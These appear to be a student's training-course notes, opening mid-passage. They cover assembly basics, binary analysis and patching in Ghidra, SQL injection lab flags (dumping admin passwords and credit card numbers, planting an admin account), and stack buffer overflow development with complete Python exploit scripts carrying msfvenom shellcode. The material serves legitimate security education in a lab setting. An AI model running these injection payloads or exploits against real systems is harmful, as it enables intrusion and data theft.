ZeroFlag set means they are the same.
cmp r8, r9  <- compare value of r8 to r9. Set flags as appropriate.


JMP: Jump to specified location
jmp MEM1    <-jump to memory label MEM1


JLE: Jump if less than or equal
jle MEM1    <-jump to memory label MEM1 if less than or equal


JE: Jump if equal
je MEM1     <-jump to memory label MEM1 if equal


## Reverse Engineering Workflow Software


    Static

    Behavioral

    Dynamic

    Disassembly

    Document Findings

## Initial Static Analysis (KEY)
Initial static analysis of a binary gives an analyst, or team of analysts, several clues as to what the binary is designed to do and how it really works.

1. Determine file type - Is it an executable? What environment is it designed to run in? (OS,cpu architecture, etc)   FILE COMMAND

2. Determine if file is packed/compressed (UPX)

3. Find plain text ascii and unicode strings

4. View imports/exports to get a hint of functionality/calls (is it importing a library that can open a socket, etc?)

5. Look for encrypted sections of the binary


## Behavioral Analysis (KEY)
Behavioral Analysis is the fastest way to gain insight into how a binary works.

1. Take a snapshot of the analysis environment - Important! Taking a snapshot on an OpenStack
VM takes a substantial amount of time.

2. Take a snapshot of critical configurations of the analysis environment. (Things like the registry, important directories, etc)

3. Launch realtime analysis tools (Things like procmon and fakenet)

4. Execute and interact with the object/binary while taking note of observations.

5. Stop the binary and view how it affected critical configurations (registry, files, etc) by
comparing to previous snapshots

6. Analyze results of realtime analysis tools (did fakenet catch network calls, did procmon show it writing to a file, etc)


## Dynamic Analysis (KEY)
Dynamic analysis is similar to behavioral, except the analyst is attaching the process to a debugger

1. Execute binary in a debugger

2. Step through binary, setting breakpoints as approriate

3. Continuously rerun the binary and edit it’s parameters through the debugger, as you learn
more about how it works

4. Document all observations and modifications


## Disassembly
An analyst will eventually get to a point where they need to disassemble a binary to learn more about how it runs

1. Disassemble binary in IDA, Ghidra, or other disassembler

2. Use notes to find artifacts within the disassembly

3. Find a good spot to work from within the binary. Then quickly browse from the top to the
bottom of the disassembly to view the overall flow of the disassembly

4. Rename variables and functions as appropriate when quickly scanning top to bottom of the
disassembly.

5. Work your way from the bottom to the top - if there are two outcomes choose the one you want to end at, then work your way up from there to determine what needs to happen for the
program to flow to the desired outcome.


## Document findings
Analysts must document their findings after performing reverse engineering or software analysis.

1. Document all discovered binary traits, capabilities, and behaviors to include the conditions they must run under.

2. Document potential uses for the binary.

3. Create mitigations for the binary if it is malicious.

4. Create signatures and indicators of compromise to detect the binary in the future.

5. Document and save the tools, scripts, code, methods used to analyze the software to better
analyze related software in the future.

6. Document proof of concept for exploitation of the binary if it is found to be vulnerable and a potential target. For example, if the binary is running on an adversary network, or if a friendly network may be using the binary.


## x86_64 Stack (DEMO)
```
main:
    mov rax, 16     //16 moved into rax
    push rax        //push value of rax (16) onto stack. RSP is pushed up 8 bytes (x86 is 64 bits)
    jmp mem2        //jmp to mem2 memory location

mem1:
    mov rax, 0      //move 0 (error free) exit code to rax
    ret             //return out of code (ax is the ret default registry)
			64bit rax 32bit eax and 16bit ax

mem2:
    pop r8          //pop value on the stack (16) into r8. RSP falls 8 bytes
    cmp rax, r8     //compare rax register value (16) to r8 register value (16) they are equal so the zero flag is set
    je mem1         //jump if comparison has zero bit set to mem1

```

```
main:
    mov rcx, 25     //store the value 25 in rcx register
    mov rbx, 62     //store the value 62 in rbx register
    jmp mem1        //jumps to mem1 location

mem1:
    sub rbx, 40     //subtract 40 from rbx 62-40+22  rbx = 22
    mov rsi, rbx    //copy rbx value to rsi
    cmp rcx, rsi    //compare the values in rcx and rsi ZeroFlag is not set Sign Flag is set Overflow Flag is not set
    jle mem2      //jumps to mem2 location if value is less than or equal

mem2:
    mov rax, 0      //store 0 in rax
    ret             //return out of code
```


## Windows Ops Executable (DEMO 1)

xfreerdp /u:student /v:10.50.21.242 -dynamic-resolution +glyph-cache +clipboard

https://learn.microsoft.com/en-us/sysinternals/downloads/

Static Analysis :
strings.exe


```
#include <windows.h>			## INCLUDE LINES 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int firstKey(key1)
{
    int key2 = atoi(key1);		## Creating key 2 and atoi(key1) will take ASCII to integar
	int p2 = 29;			## Creating p2 = 29 integar
    if ((key2-123)==0)			## if key2 -123 ==0 then return 13555 to the main function
    {
        return 13555;			
    }
    return 12;     
}

int main(void)				## START
{
    char key1[20];			## Creates character array of 20 bytes
    printf("Enter Key: ");		## Prints Enter Key: to stdout
    fgets(key1,20,stdin);		## takes user input and storuying 20bytes of it into key1
    strtok(key1, "\n");			## create a string token using key1 broking into tokens seperated by new line
    if (firstKey(key1)==13555)		## if firstkey(key1) == 13555 then Succes else Failed
    {
        printf("Success!!.\n");
	    Sleep(5000);
		return 0;
    }
    else
    {
        printf("Failed!!.\n", key1);	## Else print failed, sleep for 5 seconds and return 0
	    Sleep(5000);
		return 0;
    }
}

```

Strings
.\Downloads\SysinternalsSuite\streams.exe '.\Downloads\demo1_new.exe'


View Contents of EXE
Get-Content '.\Downloads\demo1_new.exe'

Run Demo1.exe
```
PS C:\Users\student> .\Downloads\demo1_new.exe                                                                          
Enter Key: 1                                                                                                            
Failed!!.                                                                                                               
PS C:\Users\student> .\Downloads\demo1_new.exe                                                                          
Enter Key: 123   					## We know this because we read source code                                                                                                       
Success!!.     
```


Ghidra
Create new project
Drag exe into window importing it into Project Window
Double Click executable in window
Select Yes to analyze and then Analyse Button
Search For Strings: Filter on Word
```
{
  FILE *pFVar1;
  int iVar2;
  char local_1c [20];
  uint local_8;
  
  local_8 = DAT_0041a02c ^ (uint)&stack0xfffffffc;
  FUN_00401130((wchar_t *)s_Enter_Key:_0041a000);
  pFVar1 = (FILE *)___acrt_iob_func(0);
  FUN_00403308(local_1c,0x14,pFVar1);
  _strtok(local_1c,&DAT_0041a00c);
  iVar2 = FUN_00401000(local_1c);
  if (iVar2 == 13555) {
    FUN_00401130((wchar_t *)s_Success!!._0041a010);
    Sleep(5000);
  }
  else {
    FUN_00401130((wchar_t *)s_Failed!!._0041a01c);
    Sleep(5000);
  }
  FUN_0040116a(local_8 ^ (uint)&stack0xfffffffc);
  return;
}

```


## Windows Executable Analysis (DEMO 2)

Strings.exe against executable
Get-Contents demo2.exe
Open and look at source code

```
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int firstKey(key1)
{
    if (strcmp(key1,"key")==0)			## IF KEY1 == string "key" return 65664
    {
        return 65664;
    }
    return 12;     
}

int main(void) 
{
    char key1[20];
    printf("Enter Key: ");
    fgets(key1,20,stdin);
    strtok(key1, "\n");
    if (firstKey(key1)==65664)			## IF 65664 is equal to 65664 then return success
    {
        printf("Success.\n");
	    Sleep(5000);
		return 0;
    }
    else
    {
        printf("%s is not the key.\n", key1);
	    Sleep(5000);
		return 0;
    }
}


```
```
PS C:\Users\student> & '.\Downloads\demo2_new (1).exe'                                                                
Enter Key: Key                                                                                                          
Key is not the key.                                                                                                     
PS C:\Users\student> & '.\Downloads\demo2_new (1).exe'                                                                  
Enter Key: key            				## key was the correct key                                                                                              
Success. 
```


OPEN WITH GHIDRA and ANALYZE IT
Search for string Success found within running the EXE in powershell
Double CLick Function from Main window
Find Success and work backwards


## Commands

C:\Users\student>pscp student@10.50.37.42:/home/student/Downloads/* C:\Users\student\Desktop                            
student@10.50.37.42's password:                                                                                        
entry.exe                 | 110 kB | 110.5 kB/s | ETA: 00:00:00 | 100%                                                  
ntry.c                   | 0 kB |   0.3 kB/s | ETA: 00:00:00 | 100% 





## Portable Executable Patching/ Software Anaylsis (DEMO)

Perform Debugging and Disassembly

Find the Success/Failure

Adjust Instructions

Apply Patch and Save

Execute Patched Binary

1. Find Success Statement
2. Modify so you always receive the Success Statement
3. Run the Binary



DEMO1.exe 
In this demo we take an EXE and we modify the success statement and make it always return Successful

1. Strings and search for key word.
2. Double Click the function that is referenced from the key word.
3. Find Success Statement and work backwards
4. Follow the value that returns the Success Statement back to the function
5. Write Click intruction and Patch Instruction to always return the value that returns Success
6. File -> Export Program -> Format "PE" -> Change Name --> Export
7. Run the program and see if the changes return the Success




# SQL INJECTION PRACTICE
## Categories Page (FLAG)
1. Click 1st Category to Populate the Products by Category Database
2. Within the URL you notice: http://127.0.0.1:2500/cases/productsCategory.php?category=1
3. You can input commands after the category=1 placement
4. http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT 1,2,3(4,5,6, etc)
	This will allow you to see how big the table is and let you feel for the database size.
5. Once you know the size of the database you can use the golden statement to get all the information on the database
6. http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
	This will populate the entire database with the Table Schema, Table Name, and Column  Names within the database making it easier to call information out.
7. The flag can be found within the sqlinjection.products search

http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT category,name,description FROM sqlinjection.products


## Admin Credentials (FLAG)
1. To find this flag we are able to use the same URL in the top to query
2. We need ADMIN Password so we will query using this UNION SELECT Statement
http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT username,password,firstname FROM sqlinjection.members
3. This pulls username,password,first_name from the sqlinjection.members database
4. From there we are able to see the administrator credentials


## PRODUCTS (FLAG)
1. Using the Search Bar we are asked to locate a flag from the page
2. First we need to test the Input Search Box to see if its vulnerable
3. Enter something legitemate "RAM' followed by the truth statement OR 1 = '1 (ex. ram' or 1 = '1)
4. If information is given after the truth statement try then it is vulnerable to queries
5. Now we run the UNION SELECT 1,2(3,4,5) to see how big the fields are
6. Once we know the size of the fields we can use the golden statement (UNION SELECT table_schema,table_name FROM information_schema.columns)

## Version (FLAG)
1. In order to get this flag we will need to search for @@version within the information_schema.columns database
2. Using the Search page ram' UNION SELECT @@version,2 from information_schema.columns #
3. Using the URL ...category=1 UNION SELECT @@version,2,3 from information_schema.columns
4. We need to add the 2,3,(4,5) depending on the size of the fields
5. @@version returns the version of the database


## Credit CARD (FLAG)
1. Budget PAGE
2. WE utilized the categories page URL method to query information
3. We got creditcard information from using the following query
4. http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT id,creditcard_number,date from sqlinjection.payments

## ID Search (FLAG)
1. To get the ID FLAG we received a HINT to look left and look right
2. In order to get this flag we used the following query reorder to see ID on the right and not the left
3. UNION SELECT comment,data,id FROM share4
4. Keys to the Kingdom	Nk43UmI3MTNaSmkxdVVINUplN28K	1337
5. The FLAG was just encoded with BASE64

## Create an ADMIN USER (FLAG)

1. Using /cases/register.php we are asked to create a user with admin permissions ensuring the First Name is set to Hacker
2. Create a normal account and view query in order to see the formatting of what is being submitted to create the account
3. INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('soem', 'some', 'some', 'some', 'some', 3)
4. Once this is identified find which field can be used to create this SQL Injection (username)
5. Create your own QUERY to create the ADMIN Account
6. INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', '1', '1', '1', 3)
7. See the query to see what is being ran. We can input our own code and modify it to make our own adjustments
8. (5' ,'1', '1', 1) -- ) is what we entered in the username field to create a user with username,password,and email 1 with permission field 1
9. Flag was granted on loggin






# Exploit Developement
https://sec.cybbh.io/public/security/latest/lessons/lesson-7-exploit_sg.html
https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/07-exploit-development.html

## Buffer Overflow common Terms
```
HEAP
STACK
REGISTER
INSTRUCTION POINTER IP
STACK POINTER SP
BASE POINTER BP
FUNCTION
SHELL CODE
```

## Buffer Overflow Defenses 

Non executable (NX) stack

For this buffer overflow example to work requires that the shellcode be placed on the stack. There should 
never be executable code on the stack, so marking the allocated memory for the stack as non-executable is 
prudent. Typically, by default, the compiler ensures that the code is compiled to prevent execution of 
code on the stack. If your desire is to override this behavior, for example to create code to demonstrate 
a buffer overflow, then, on Linux, pass the execstack option to the linker. This can be done by using -z 
execstack in gcc.


Address Space Layout Randomization (ASLR)

ASLR is a mechanism that pseudo-randomizes the memory addresses of the stack, running processes and
shared objects in memory. Addresses are subject to change each time the program is executed and since the
buffer overflow example above relies predicting the value of the IP, implementing ASLR will reduce the
reliability of the buffer overflow exploit so that is is very likely that it will fail.

Unlike other protections that part of the executable and are implemented at compile time, ASLR is a 
function of the kernel and it can be viewed or manipulated by this pseudo file in proc:

/proc/sys/kernel/randomize_va_space

The following values are supported:

   0 – No randomization. Everything is static. (needed for the above demo)
   1 – Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
   2 – Full randomization. In addition to elements listed in the previous point, memory managed through
   brk() is also randomized.

You can view its current value by using cat to display its contents:

cat /proc/sys/kernel/randomize_va_space

You can set its value by using echo and redirection to overwrite its previous contents:

echo 0 > /proc/sys/kernel/randomize_va_space


Data Execution Prevention (DEP)

Data is data, and not code and should never execute. The stack is designed to hold data. Code should
never execute within the region allocated for the stack. The stack is meant to maintain the contents of 
variables, registers, etc. and perform general housekeeping for the program. The stack should never be 
used to place or execute code. The -z noexecstack option with gcc passes this option to the linker which 
marks the area of memory occupied by the stack as non-executable and an attempt to change the IP to that 
area will result in a segmentation fault.


Stack Canaries

When performing a buffer overflow, you are writing over areas of the stack that has been allocated and . 
The gcc option -fstack-protector, enabled by default on modern distributions, adds extra code which 
interleaves values within stack without affecting the items on the stack so if any of these interleaved 
items are overwritten, the program will halt and you will see a stack smashing error. Stack Canaries 
create these interleaved values at run-time so they change each time the program is executed which adds 
to the complexity of subverting them.


Position Independent Executable (PIE)

PIE code pseudo-randomizes all sections of the code to maximize protections against buffer overflows.

PIE is set by compiling the program with using the -fPIE option. Many modern Linux distributions set this 
by default, but it can be forced by using the option -no-pie.


## GDB Uses (INSTALL)

```
Installation of Peda Plugin

git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

Common Commands

disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point
```


## BUFFER OVERFLOW "Func" (DEMO)

1. Static Analysis
	- GHIDRA Drag and Open "Func" in GHIDRA
   		- String Search to find function (We find a get() function as our Vulnerability ## Same as fgets() but it has a limit)
	- STRINGS.EXE Powershell > .\Downloads\SysinternalsSuite\strings.exe .\Downloads\func (RUN STRINGS ON FUNC With this try and see what system its made for ELF (LINUX) PE (MICROSOFT))
	- Get-Content .\Downloads\Func (Gives more information about executable) 
	- ELF so we need to transfer from WinOPS to LinOPS via:
  		- scp student@10.50.21.242:C:/Users/student/Downloads/func .


2. Dynamic Analysis
	- run ls -l on the "func" (If its not executable make it executable with "chmod 744 func")
	- student@lin-ops:~$ file func (Run the FILE command to see what Func is)
	- Execute the program calling it "./func"
	- Try and pass ./func a argument ./func $(echo"aaaaaaaaaaaaaa") It doesnt take arguments
	- Try ./func <<<$(echo"aaaaaaaaaa") this is saying that after ./func is running pass it this command in $()
	- gdb ./func	(Run the GDB)
		- peda is already installed no need to install peda
		- run command is how to start program
		- Since we know vulnerable function is get() we can run "info functions" to find it
		- To disassemble a function we run "disass getuserinput" and for color code we "pdisass getuserinput"
		- call 0x565553d0 <gets@plt> is highlighted in red
		- shell command gives you a shell from GDB and exit to go back to GDB
		- run <<<$(echo "aafdafdvcjadsbkhjbfhjdbasjfhjdbabfdkbfkjdbsafkdkfajbahfkdasjcndlkjanlkdlcdlncadbscldbsalhj") is how to pass information into GDB program to break it
		- Make a .py script that will generate a string to perform the buffer overflow for us against the program.
			- vim bufferoverflow.py and chmod 755
```
#!/usr/bin/env python

buffer = "A" * 40 # This number changes to find the buffer size.

print(buffer)
```

	-Using gdb use run <<<$(./bufferoverflow.py) to change the buffer size and get a feel for the size of the buffer
    	- Wiremask.eu -> Tools -> BufferOverflowPatternGenerator -> Copy the 200 byte pattern and paste it as the "buffer" variable
      	- run <<<$(./bufferoverflow.py)
		- COPY HEX VALUE FROM THE EIP and paste it inside Wiremask.eu --> BufferOverflowPatternGenerator to find the OFFSET
   		- Once OFFSET is found adjust the buffer variable to match the value (62)
      		- Now we create a "eip" variable set to "BBBB"
	 	- Change Print line to print(buffer+eip)
		- When we run the run <<<$(./bufferoverflow.py) with the changes we can verify if BBBB is written into the EIP register
   		- Open new window and Open GDB inside a clean environment with "env -gdb ./func"
      		- "show env" will show us env variables and we will unset ALL values using "unset env {VARIABLE}"

 		GET EIP ON TARGET MACHINE
	 	- NORMAL GDB ASSEMBLY LOCATIONS inside (gdb) "run" to see memory location and break it
    		- NORMAL GDB run "info proc map" and COPY the START of next memory address down from the [HEAP] and the END of [STACK] Line
       		- PASTE noth  into your python script as "find /b {address1}, {address2}, 0xff, 0xe4" COPY THIS AND PASTE IN NORMAL GDB
	  	- PASTE INTO NORMAL GDB "find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4" and grab the FIRST 4 addresses as these are the first jump esp locations
     		- PASTE the 4 locations into your SCRIPT THEN BREAK INTO BYTES AND FLIP
					- 0xf7de3b59 --> 0xf7 de 3b 59 --> "\x59\x3b\xde\xf7" FINAL
     					- 0xf7f588ab --> 0xf7 f5 88 ab --> "\xab\x88\xf5\xf7" FINAL
					- 0xf7f645fb --> 0xf7 f6 45 fb --> "\xfb\x45\xf6\xf7" FINAL
     					- 0xf7f6460f --> 0xf7 f6 64 0f --> "\x0f\x64\xf6\xf7" FINAL
	  	- QUIT NORMAL GDB using "quit"
     		- Now we can Generate SHELL CODE using MSFVENOM / MSFCONSOLE
		- MSFVENOM (Creating shell code)
   				- msfvenom --list payloads
				- msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
    		-MSFCONSOLE 
       				- msfdb init
	   			- msfconsole
       				- use payload/linux/x86/exec
	   			- show options
       				- set CMD whoami
	   			- generate -b '\x00' -f python
    		- COPY FIRST JMP LOCATION \x59\x3b\xde\xf7 and insert it in your "eip" variable as (eip = "\x59\x3b\xde\xf7")
       		- CREATE a (nop = "\x90" * 15) Variable
	  	- COPY and paste your msfvenom output into script
	  	- CHANGE PRINT to "print(buffer+eip+nop+buf)"
     		- run <<<$(./bufferoverflow.py) with saved changes if it doesnt work we have to REGENERATE SHELL CODE from MSFCONSOLE/VENOM
		- BELOW has the final script and exploit used
```
#!/usr/bin/env python

buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b"" 
buf += b"\xba\xae\x60\x19\x3b\xda\xc9\xd9\x74\x24\xf4\x5f"
buf += b"\x2b\xc9\xb1\x0b\x31\x57\x14\x83\xc7\x04\x03\x57"
buf += b"\x10\x4c\x95\x73\x30\xc8\xcf\xd6\x20\x80\xc2\xb5"
buf += b"\x25\xb7\x75\x15\x45\x5f\x86\x01\x86\xfd\xef\xbf"
buf += b"\x51\xe2\xa2\xd7\x65\xe4\x42\x28\x1d\x8c\x2d\x49"
buf += b"\x8c\x25\xb2\xde\x1d\x3c\x53\x2d\x21"

print(buffer+eip+nop+buf)
```

```
gdb-peda$ run <<<$(./bufferoverflow.py)
Starting program: /home/student/func <<<$(./bufferoverflow.py)
Enter a string: 
process 3112 is executing new program: /bin/dash
[New process 3115]
process 3115 is executing new program: /usr/bin/whoami
student
[Inferior 2 (process 3115) exited normally]

```


LAST STEP - Verify if it work run the code with the script as input


```
student@lin-ops:~$ ./func <<<$(./bufferoverflow.py)
Enter a string: 
student
```



## ELF Exploitation (FLAG)
Download and transfer to LinOPs
scp inventory.exe student@10.50.37.42:.

Copy from linops to windows 
scp student@10.50.37.42:/home/student/inventory.exe c:\Users\student\Desktop

Useful GDB commands:
info registers
info proc map
find
run
break *0x00000000
continue 

View in GHIDRA the STRINGS
```
undefined4 getTheGoods(void)

{
  char local_4c [68];
  
  printf("Press enter to view inventory: ");
  fgets(local_4c,0x200,stdin);
  puts(
      "Total Inventory:\nBandages: 12\nKvass: 1.000\nTurnips: 12.000\n5.45x39: 20.000\nAK-74M: 200\n Zastava Koral: 50"
      );
  usleep(5000);
  return 0;

```

Run Normally to see output

Run GDB ./inventory.exe to start GDB on the executable 

Run pdisass getTheGoods

Create your py buffer overflow script
```
#!/usr/bin/env python
buffer = "A" * 60

print(buffer)

```


Run in GDB using the Random WIREMASK to Find OFFSET
COPY EIP and enter into WIREMASK
76 is the OFFSET so now modify the bufferoverflow.py 

```
#!/usr/bin/env python

buffer = "A" * 76


```

Now find jump locations using NORMAL GDB
```
env - gdb inventory.exe
unset env LINES
unset env COLUMNS
run
Inventory: {MAKE IT ERROR}
```


Once it ERRORs Copy the start of the next location after HEAP and the end of the STACK and use the find command
```
0xf7de1000
0xffffe000
"find /b {address1}, {address2}, 0xff, 0xe4"
```


Once the find comes back copy the first four addresses. Split them and reverse them
```
0xf7de3b59 --> 0xf7 de 3b 59 --> \x59\x3b\xde\f7
0xf7f588ab --> 0xf7 f5 88 ab --> \xab\x88\xf5\xf7
0xf7f645fb
0xf7f6460f


```

NEXT Generate SHELL CODE
```
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
COPY SHELL CODE TO SCRIPT

-MSFCONSOLE 
       				- msfdb init
	   			- msfconsole
       				- use payload/linux/x86/exec
	   			- show options
       				- set CMD whoami
	   			- generate -b '\x00' -f python
```

SCRIPT place shellcode into script with NOP and EIG values pulled from JMP locations FROM COMRADE
```
#!/usr/bin/env python

buffer = "A" * 76
eip = "\x59\x3b\xde\f7"
nop = "\x90" * 15
buf =  b""
buf += b"\xdb\xca\xd9\x74\x24\xf4\x5a\xb8\x72\xe8\x99\x97"
buf += b"\x29\xc9\xb1\x0b\x31\x42\x19\x03\x42\x19\x83\xea"
buf += b"\xfc\x90\x1d\xf3\x9c\x0c\x47\x56\xc5\xc4\x5a\x34"
buf += b"\x80\xf3\xcd\x95\xe1\x93\x0d\x82\x2a\x01\x67\x3c"
buf += b"\xbc\x26\x25\x28\xb9\xa8\xca\xa8\xb1\xc0\xa5\xc9"
buf += b"\x50\x79\x3a\x5d\xf8\xf0\xdb\xac\x7e"

print(buffer+eip+nop+buf)
```

FROM COMRADE PULL MEM LOCATIONS
RUN sudo ./inventory.exe <<<$(python /home/comrade/buf.py)
```
#!/usr/bin/env python
buffer = "A" * 76
eip = "\x51\x1b\xdf\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xdb\xc8\xd9\x74\x24\xf4\xbd\x54\x1e\x22\xe1\x58"
buf += b"\x2b\xc9\xb1\x11\x31\x68\x17\x83\xe8\xfc\x03\x3c"
buf += b"\x0d\xc0\x14\xd6\x3a\x5c\x4e\x74\x5b\x34\x5d\x1b"
buf += b"\x2a\x23\xf5\xf4\x5f\xc4\x06\x62\x8f\x76\x6e\x1c"
buf += b"\x46\x95\x22\x08\x45\x5a\xc3\xc8\x15\x3b\xb7\xe8"
buf += b"\xf6\x95\x44\x8d\x6b\x98\xcf\x39\x43\x72\x66\xa4"
buf += b"\xe9\xf3\xf5\x43\x6d\x76\x9f\xff\x5f\x06\x3b\x9d"
buf += b"\x9f\xb1\x90\xe8\x41\xf0\x97"

print(buffer+eip+nop+buf)

```



## ACOSTA CLASS DEMO

Demo for initial analysis with gdb:
```
root@linux-opstation-pkbk:/demo# gdb func
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git

disass main
Dump of assembler code for function main:
   0x000005c0 <+0>:	lea    ecx,[esp+0x4]
   0x000005c4 <+4>:	and    esp,0xfffffff0
   0x000005c7 <+7>:	push   DWORD PTR [ecx-0x4]
   0x000005ca <+10>:	push   ebp
   0x000005cb <+11>:	mov    ebp,esp
   0x000005cd <+13>:	push   ecx
   0x000005ce <+14>:	sub    esp,0x4
   0x000005d1 <+17>:	call   0x623 <__x86.get_pc_thunk.ax>
   0x000005d6 <+22>:	add    eax,0x1a2a
   0x000005db <+27>:	call   0x5ea <getuserinput>
   0x000005e0 <+32>:	nop
   0x000005e1 <+33>:	add    esp,0x4
   0x000005e4 <+36>:	pop    ecx
   0x000005e5 <+37>:	pop    ebp
   0x000005e6 <+38>:	lea    esp,[ecx-0x4]
   0x000005e9 <+41>:	ret
End of assembler dump.

disass getuserinput
Dump of assembler code for function getuserinput:
   0x000005ea <+0>:	push   ebp
   0x000005eb <+1>:	mov    ebp,esp
   0x000005ed <+3>:	push   ebx
   0x000005ee <+4>:	sub    esp,0x44
   0x000005f1 <+7>:	call   0x490 <__x86.get_pc_thunk.bx>
   0x000005f6 <+12>:	add    ebx,0x1a0a
   0x000005fc <+18>:	sub    esp,0xc
   0x000005ff <+21>:	lea    eax,[ebx-0x1950]
   0x00000605 <+27>:	push   eax
   0x00000606 <+28>:	call   0x420 <puts@plt>
   0x0000060b <+33>:	add    esp,0x10
   0x0000060e <+36>:	sub    esp,0xc
   0x00000611 <+39>:	lea    eax,[ebp-0x3a]
   0x00000614 <+42>:	push   eax
   0x00000615 <+43>:	call   0x410 <gets@plt>
   0x0000061a <+48>:	add    esp,0x10
   0x0000061d <+51>:	nop
   0x0000061e <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x00000621 <+55>:	leave
   0x00000622 <+56>:	ret
End of assembler dump.
```
Next, continue slowly adding A’s onto your input until you seg fault again.
```
run
Starting program: /demo/func
Enter a string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
```
Now that you have the buffer that seg faults, add 4 B’s to the end. This should completely overwrite the $eip with the hex value of B which is 42. If it does not, then add or remove A’s until it does.
```
run
Starting program: /demo/func
Enter a string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[2J[H[----------------------------------registers-----------------------------------]
[mEAX: 0xffffeddf
EBX: 0x1
ECX: 0xfbad2288
EDX: 0x0
ESI: 0x1
EDI: 0xf7fb8000 --> 0x1b3db0
EIP: 0x42424242 ('BBBB')
```
We can now take this input string and begin crafting our exploit code.


/buff.py
```
buffer = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

EIP = "BBBB"

nop = '\x90' * 5

print(buffer + eip + nop)
```
We added a nop sled here so that when the program crashes next time, we can look on the stack and ensure that our 5 nop’s were added.

Let’s run this in gdb to test it out.
```
run <<< $(python demo_attack.py)
Starting program: /demo/func <<< $(python /tmp/exploit.py)
Enter a string:

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
[mEAX: 0xffffdbbe ('A' <repeats 58 times>, "\374\333\377\377\220\220\220\220\220\220\220\220\220\220")
EBX: 0x41414141 ('AAAA')
ECX: 0xfbad2088
EDX: 0xf7fb987c --> 0x0
ESI: 0x1
EDI: 0xf7fb8000 --> 0x1b3db0
EBP: 0xffffdbfc --> 0x90909090
ESP: 0xffffdc00 --> 0x90909090
EIP: 0x90909090
[mEFLAGS: 0x10282 (carry parity adjust zero 1;31mSIGN trap 1;31mINTERRUPT direction overflow)
[m[-------------------------------------code-------------------------------------]
31mInvalid $PC address: 0x90909090
[m[------------------------------------stack-------------------------------------]
[m0000| 0xffffdc00 --> 0x90909090
```
We redirected the output of our exploit.py into the target binary, received a seg fault, and successfully placed our NOPs on the stack. We must now find a way to get back to the top of the stack where our nop sled and eventual shell code will be sitting.


Our tactic will be to find "jmp esp".

Get back into gdb, but this time we will be using "env" to create an environment the same as our execution environment. That means that we will have the same memory addresses and offsets in gdb as when our binary executes. To do so:
```
root@linux# env - gdb func
```
GDB will still add two variables that we need to unset.
```
show env
env LINES = 12
env COLUMNS = 10

unset env LINES
unset env COLUMNS

show env
```
Once program has crashed or stopped running run the following command:
```
info proc map
```
This will return a massive range of potential memory addresses to search through.

Mapped address spaces:
```
	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/student/func
	0x56556000 0x56557000     0x1000        0x0 /home/student/func
	0x56557000 0x56558000     0x1000     0x1000 /home/student/func
	0x56558000 0x5657a000    0x22000        0x0 [heap]
	0xf7de2000 0xf7fb4000   0x1d2000        0x0 /lib32/libc-2.27.so            # First one under heap
	0xf7fb4000 0xf7fb5000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb5000 0xf7fb7000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb7000 0xf7fb8000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fb8000 0xf7fbb000     0x3000        0x0
	0xf7fcf000 0xf7fd1000     0x2000        0x0
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]                       # First on one stack
```
To search for "jmp esp" run the command:
```
find /b 0xf7de2000 , 0xf7ffe000, 0xff, 0xe4
```
msfvenom CMD
```
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
```
msfconsole CMD

Let’s select a payload for a proof of concept. We are exploiting an x86 32 bit program on a Linux machine. "Linux/x86/exec" should execute whatever we want.
```
use payload/linux/x86/exec
```
"show options" will allow us to view what we can set.
```
show options
Module options (payload/linux/x86/exec):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD                    yes       The command string to execute
```
linux/x86/exec only takes a CMD option that is the command you want to run. Let’s set that to 'cat users' since that is a protected file in the same directory as the binary.
```
set CMD cat users

generate -b "\x00" -f python
# linux/x86/exec - 72 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false,
# PrependSetreuid=false, PrependSetuid=false,
# PrependSetresgid=false, PrependSetregid=false,
# PrependSetgid=false, PrependChrootBreak=false,
